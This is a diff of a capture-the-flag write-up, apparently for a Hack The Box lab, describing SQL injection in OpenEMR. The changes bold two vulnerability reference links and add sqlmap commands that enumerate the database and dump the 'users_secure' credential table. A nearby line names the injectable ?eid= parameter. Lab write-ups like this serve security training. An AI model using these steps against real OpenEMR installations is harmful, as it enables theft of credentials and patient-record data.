@@ -153,9 +153,9 @@ Then, I was able to access OpenEMR login page via `http:/hms.htb`.
 
 By Google searching about OpenEMR, I was able to discover some good amount of known vulnerabilities associated with this product. 
 
-* Vulnerability Disclosure Report - https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf
+* <b>Vulnerability Disclosure Report</b> - https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf
 
-* OpenEMR Simulated Attack - https://www.youtube.com/watch?v=DJSQ8Pk_7hc
+* <b>OpenEMR Simulated Attack</b> - https://www.youtube.com/watch?v=DJSQ8Pk_7hc
 
 In a nutshell, the product was written in PHP and heavily vulnerable to multiple SQLi attacks because the codes were not sanitizing the user input properly, and most of the SQL syntax were not written in parameterized queries.
 
@@ -177,6 +177,14 @@ By adding `?eid='` at the end of the above page, we can cause the SQL error.
 
 
 
+
+```
+sqlmap -r openemr.req --threads=10 --dbs
+
+sqlmap -r openemr.req --threads=10 -D openemr --tables
+
+sqlmap -r openemr.req --threads=10 -D openemr -T users_secure --dump
+```
 
 
 ## Privilege Escalation
